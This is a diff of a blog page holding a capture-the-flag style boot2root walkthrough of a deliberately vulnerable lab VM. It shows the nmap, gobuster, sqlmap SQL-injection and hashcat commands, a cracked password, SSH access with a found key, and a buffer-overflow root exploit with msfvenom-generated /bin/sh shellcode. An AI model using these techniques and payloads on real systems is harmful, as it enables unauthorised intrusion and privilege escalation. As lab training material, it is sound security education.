@@ -70,6 +70,8 @@ Discovery We begin our journey with a port scan. The VM tells us it&rsquo;s IP o
         
         <li><a href="https://www.patreon.com/olihough86"><i class='fa fa-patreon '></i>  PATREON</a></li>
         
+        <li><a href="https://paypal.me/olihough86"><i class='fa fa-paypal '></i>  PAYPAL</a></li>
+        
       
       </ul>
     </div>
@@ -111,10 +113,7 @@ Networking: Auto DHCP (192.168.1.45)</p>
 
 <p>We begin our journey with a port scan. The VM tells us it&rsquo;s IP on boot so we don&rsquo;t need to go and scan our own network to find the host, in my case the IP is 192.168.1.45.<br />
 Everyone has their own preferences for which port scanner to use and with which options, mine is as follows.</p>
-
-<pre><code>nmap -v -sS -A -T4 --reason -oA target_syn --webxml -p- 192.168.1.45
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">nmap -v -sS -A -T4 --reason -oA target_syn --webxml -p- 192.168.1.45</code></pre></div>
 <script src="https://asciinema.org/a/190671.js" id="asciicast-190671" async></script>
 
 <p>Lets break this down so we know what&rsquo;s going on.</p>
@@ -205,10 +204,7 @@ Everyone has their own preferences for which port scanner to use and with which 
 <h2 id="pivoting">Pivoting</h2>
 
 <p>Pivoting on a http proxy is fairly trivial for what we need it for, we can test our theory with a simple curl request.</p>
-
-<pre><code>curl --proxy http://192.168.1.45:31337 127.0.0.1:8080
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">curl --proxy http://192.168.1.45:31337 127.0.0.1:8080</code></pre></div>
 <script src="https://asciinema.org/a/190817.js"  data-rows="15" id="asciicast-190817" async></script>
 
 <p>Why 127.0.0.1? Well as we are passing our http request through the proxy, 127.0.0.1 refers to the localhost of the proxy server (192.168.1.45) and not our machine.</p>
@@ -224,10 +220,7 @@ Everyone has their own preferences for which port scanner to use and with which 
 <p>So we have access to the web server, now we need to check to see if there are any interesting files that could help us get a foothold in this server. After trying a couple of different word lists, the directory-list-2.3-small.txt list from from the (now defunct) DirBuster project came up with with a good result.</p>
 
 <p>Gobuster is my content discovery tool of choice, due to it&rsquo;s simplicity and decent speed</p>
-
-<pre><code>gobuster -p http://192.168.1.45:31337 -u http://127.0.0.1:8080 -w /usr/share/wordlists/directory-list-2.3-small.txt
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">gobuster -p http://192.168.1.45:31337 -u http://127.0.0.1:8080 -w /usr/share/wordlists/directory-list-2.3-small.txt</code></pre></div>
 <script src="https://asciinema.org/a/190675.js" data-rows="20" id="asciicast-190675" async></script>
 
 <p>OK! now we are getting somewhere, we have found /littlesecrets-main which presents us with a login page when we visit it in our web browser.</p>
@@ -237,10 +230,7 @@ Everyone has their own preferences for which port scanner to use and with which 
 <h2 id="sql-injection">SQL Injection</h2>
 
 <p>Using SQLMap we cant test the login form for all different types of SQL injection vulnerabilities. After running SQLMap for a while we will discover that the form is vulnerable to a time based SQL injection attack via the User-Agent header.</p>
-
-<pre><code>sqlmap --dbms=mysql --data=&quot;user=admin&amp;pass=pass&amp;submit=Login&quot; --url http://127.0.0.1:8080/littlesecrets-main/login.php --proxy=http://192.168.1.45:31337 --level=5 --risk=3
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">sqlmap --dbms=mysql --data=&#34;user=admin&amp;pass=pass&amp;submit=Login&#34; --url http://127.0.0.1:8080/littlesecrets-main/login.php --proxy=http://192.168.1.45:31337 --level=5 --risk=3</code></pre></div>
 <p>To speed things up a little I&rsquo;ve already listed the table names so I know there is a table called users. By adding &ndash;dump users to the command  we can see the contents of the users table.
 <script src="https://asciinema.org/a/190824.js" id="asciicast-190824" async></script>
 Great we have two users and their password hashes pulled out of the database</p>
@@ -272,19 +262,13 @@ Great we have two users and their password hashes pulled out of the database</p>
 <h2 id="hashcat">Hashcat</h2>
 
 <p>The hashes look like md5 and as this is a boot2root we can assume at least one of them is in a dictionary.</p>
-
-<pre><code>hashcat -a 0 -m 0 d60dffed7cc0d87e1f4a11aa06ca73af /usr/share/wordlists/rockyou.txt
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">hashcat -a 0 -m 0 d60dffed7cc0d87e1f4a11aa06ca73af /usr/share/wordlists/rockyou.txt</code></pre></div>
 <p>After a short time hashcat give us the password <em>3pinkysaf33pinkysaf3</em></p>
 
 <h2 id="finally-we-have-a-shell">Finally We have A Shell</h2>
 
 <p>Trying to login to the web page will not work, however we can ssh into the machine.</p>
-
-<pre><code>ssh pinkymanage@192.168.1.45 -p64666
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">ssh pinkymanage@192.168.1.45 -p64666</code></pre></div>
 <script src="https://asciinema.org/a/190830.js" data-rows="15" id="asciicast-190830" async></script>
 
 <p>After some searching around in the filesystem I found another directory inside /var/www/html/littlesecets-main/ named ultrasecretadminf1l35 inside the ultrasecretadminf1l35 diectory there is a notes.txt and a base64 encoded file containing a SSH private key.</p>
@@ -292,10 +276,7 @@ Great we have two users and their password hashes pulled out of the database</p>
 <script src="https://asciinema.org/a/190833.js" id="asciicast-190833" async></script>
 
 <p>Copying the key and saving it as rsa_key we can then SSH into the machines as the user pinky</p>
-
-<pre><code>ssh -i rsa_key pinky@192.168.1.45 -p64666
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">ssh -i rsa_key pinky@192.168.1.45 -p64666</code></pre></div>
 <p>There are a couple of extra files which I added to pinkys home directory to help with debugging the adminhelper binary. The adminhelper binary is interesting as it has the sgid bit set. This is probably going to be our route to the root user.</p>
 
 <script src="https://asciinema.org/a/190844.js" data-rows="20" id="asciicast-190844" async></script>
@@ -313,16 +294,12 @@ Great we have two users and their password hashes pulled out of the database</p>
 <p><img src="/img/ppv1crash.png" alt="crash" /></p>
 
 <p>OK we can control execution by overwriting the instruction pointer so now we just need a place to send the program to containing our own code. First let&rsquo;s check if ASLR is enabled on the machine, if not then we can store our code in an environment variable and point RIP to the location of the variable in memory.</p>
-
-<pre><code>cat /proc/sys/kernel/randomize_va_space
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">cat /proc/sys/kernel/randomize_va_space</code></pre></div>
 <script src="https://asciinema.org/a/190872.js" data-rows="15" id="asciicast-190872" async></script>
 
 <p>As we expected ASLR is not enabled</p>
 
 <p>When we store our shellcode in an environment variable we need to know where it is in memory, luckily there is a little C snippet that will do just that</p>
-
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
@@ -338,22 +315,14 @@ Great we have two users and their password hashes pulled out of the database</p>
 	ptr <span style="color:#ff79c6">+=</span> (strlen(argv[<span style="color:#bd93f9">0</span>]) <span style="color:#ff79c6">-</span> strlen(argv[<span style="color:#bd93f9">2</span>]))<span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span>; <span style="color:#6272a4">/* adjust for program name */</span>
 	printf(<span style="color:#f1fa8c"></span><span style="color:#f1fa8c">&#34;%s will be at %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, argv[<span style="color:#bd93f9">1</span>], ptr);
 }</code></pre></div>
-
 <p>Now we copy getenvaddr.c to the machine and compile it with gcc</p>
-
-<pre><code>gcc getenvaddr.c -o getenvaddr
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">gcc getenvaddr.c -o getenvaddr</code></pre></div>
 <script src="https://asciinema.org/a/p8oIgvOAUrbbqIMSmwS7dlwg7.js" data-rows="20" id="asciicast-p8oIgvOAUrbbqIMSmwS7dlwg7" async></script>
 
 <p>Next we need some shellcode. The metsploit linux/x64/exec payload will do for what we need with the CMD set to /bin/sh. The bad characters (-b) are anything that might cause an interrupt such as null and newline characters.</p>
-
-<pre><code>msfvenom -a x64 -p linux/x64/exec CMD=/bin/sh -b '\x00\x0b\x0d\x0a\x18\x0c\x23\x24\x28\x29' | hexdump -v -e '&quot;\\\x&quot; 1/1 &quot;%02x&quot;'
-</code></pre>
-
-<p>This generates the following shellcode which we can store in an environment variable
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">48</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">31</span><span style="color:#f1fa8c">\x</span>c9<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">48</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">81</span><span style="color:#f1fa8c">\x</span>e9<span style="color:#f1fa8c">\x</span>fa<span style="color:#f1fa8c">\x</span>ff<span style="color:#f1fa8c">\x</span>ff<span style="color:#f1fa8c">\x</span>ff<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">48</span><span style="color:#f1fa8c">\x</span>8d<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">05</span><span style="color:#f1fa8c">\x</span>ef<span style="color:#f1fa8c">\x</span>ff<span style="color:#f1fa8c">\x</span>ff<span style="color:#f1fa8c">\x</span>ff<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">48</span><span style="color:#f1fa8c">\x</span>bb<span style="color:#f1fa8c">\x</span>5f<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">01</span><span style="color:#f1fa8c">\x</span>d5<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">72</span><span style="color:#f1fa8c">\x</span>2d<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">87</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">83</span><span style="color:#f1fa8c">\x</span>f5<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">48</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">31</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">58</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">27</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">48</span><span style="color:#f1fa8c">\x</span>2d<span style="color:#f1fa8c">\x</span>f8<span style="color:#f1fa8c">\x</span>ff<span style="color:#f1fa8c">\x</span>ff<span style="color:#f1fa8c">\x</span>ff<span style="color:#f1fa8c">\x</span>e2<span style="color:#f1fa8c">\x</span>f4<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">35</span><span style="color:#f1fa8c">\x</span>3a<span style="color:#f1fa8c">\x</span>8d<span style="color:#f1fa8c">\x</span>eb<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">65</span><span style="color:#f1fa8c">\x</span>3c<span style="color:#f1fa8c">\x</span>ac<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">97</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">36</span><span style="color:#f1fa8c">\x</span>6f<span style="color:#f1fa8c">\x</span>fa<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">01</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">45</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">87</span><span style="color:#f1fa8c">\x</span>d0<span style="color:#f1fa8c">\x</span>bd<span style="color:#f1fa8c">\x</span>d6<span style="color:#f1fa8c">\x</span>e6<span style="color:#f1fa8c">\x</span>bd<span style="color:#f1fa8c">\x</span>5f<span style="color:#f1fa8c">\x</span>4e<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">87</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">83</span><span style="color:#f1fa8c">\x</span>bd<span style="color:#f1fa8c">\x</span>d6<span style="color:#f1fa8c">\x</span>e7<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">87</span><span style="color:#f1fa8c">\x</span>9a<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">25</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">87</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">83</span><span style="color:#f1fa8c">\x</span>f5<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">70</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">63</span><span style="color:#f1fa8c">\x</span>bc<span style="color:#f1fa8c">\x</span>1c<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">02</span><span style="color:#f1fa8c">\x</span>f4<span style="color:#f1fa8c">\x</span>eb<span style="color:#f1fa8c">\x</span>f5<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">09</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">56</span><span style="color:#f1fa8c">\x</span>9d<span style="color:#f1fa8c">\x</span>fb<span style="color:#f1fa8c">\x</span>cb<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">88</span><span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">86</span><span style="color:#f1fa8c">\x</span>f5</code></pre></div></p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">msfvenom -a x64 -p linux/x64/exec CMD=/bin/sh -b &#39;\x00\x0b\x0d\x0a\x18\x0c\x23\x24\x28\x29&#39; | hexdump -v -e &#39;&#34;\\\x&#34; 1/1 &#34;%02x&#34;&#39;</code></pre></div>
+<p>This generates the following shellcode</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-none" data-lang="none">\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x5f\x01\xd5\x72\x2d\x87\x83\xf5\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x35\x3a\x8d\xeb\x65\x3c\xac\x97\x36\x6f\xfa\x01\x45\x87\xd0\xbd\xd6\xe6\xbd\x5f\x4e\x87\x83\xbd\xd6\xe7\x87\x9a\x25\x87\x83\xf5\x70\x63\xbc\x1c\x02\xf4\xeb\xf5\x09\x56\x9d\xfb\xcb\x88\x86\xf5</code></pre></div>
 <p>Now we are ready to put it all together and exploit the binary to gain root privileges. First we will store our shellcode in an environment variable, then get the memory address the variable is stored at and finally execute the adminhelper binary with 72 bytes plus the memory address of our variable (in reverse due to endianess)</p>
 
 <script src="https://asciinema.org/a/190883.js" id="asciicast-190883" async></script>
